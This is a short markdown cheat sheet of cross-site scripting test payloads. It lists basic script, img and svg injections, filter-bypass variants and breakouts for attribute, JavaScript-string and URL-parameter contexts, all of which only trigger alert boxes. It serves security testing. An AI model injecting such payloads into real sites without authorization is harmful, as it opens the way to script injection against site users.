# XSS Test Payloads

Use these payloads to test for Cross - Site Scripting vulnerabilities in input fields and URL parameters.

---

## Basic Payloads
    - `<script>alert(1)</script>`
    - `<img src=x onerror=alert(1)>`
    - `<svg onload=alert(1)>`
    - `javascript:alert(1)`

## Bypass Payloads
    - `<scr<script>ipt>alert(1)</script>`
    - `<IMG SRC="javascript:alert('XSS');">`
    - `<button onclick="alert('XSS')">Click Me</button>`

## Rendering Contexts
    - ** Attribute **: `"><script>alert(1)</script>`
        - ** JavaScript String **: `';alert(1)//`
            - ** URL Parameter **: `?name=<script>alert(1)</script>`
